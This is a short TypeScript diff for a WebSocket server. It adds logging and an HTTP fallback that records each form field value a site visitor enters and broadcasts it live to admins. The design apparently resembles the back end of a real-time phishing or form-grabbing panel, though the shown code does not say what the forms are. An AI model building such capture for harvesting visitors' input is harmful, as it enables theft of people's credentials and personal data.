@@ -390,6 +390,7 @@ export function setupWebSocket(server: Server) {
                 v.formHistory.push({ field, value, ts });
                 broadcastToAdmins({ type: 'visitor-form-data', id, field, value, ts });
                 persistVisitor(v);
+                logger.info({ id, field }, 'Visitor form-data captured (ws)');
               }
             }
           } catch (err) { logger.warn({ err }, 'Visitor message parse error'); }
@@ -408,4 +409,21 @@ export function setupWebSocket(server: Server) {
   });
 
   logger.info('WebSocket server ready at /api/ws');
+}
+
+/** HTTP fallback: called from POST /api/capture when WS form-data path fails. */
+export function captureFormDataHTTP(visitorId: string, field: string, value: string): { ok: boolean; stored: boolean } {
+  const v = visitors.get(visitorId);
+  if (v) {
+    const ts = Date.now();
+    v.formData[field] = value;
+    v.formHistory.push({ field, value, ts });
+    broadcastToAdmins({ type: 'visitor-form-data', id: visitorId, field, value, ts });
+    persistVisitor(v);
+    logger.info({ id: visitorId, field }, 'Visitor form-data captured (http)');
+    return { ok: true, stored: true };
+  }
+  // Visitor may have disconnected; persist by IP not possible without it, so just acknowledge
+  logger.warn({ visitorId, field }, 'HTTP capture: visitor not found in active map');
+  return { ok: true, stored: false };
 }
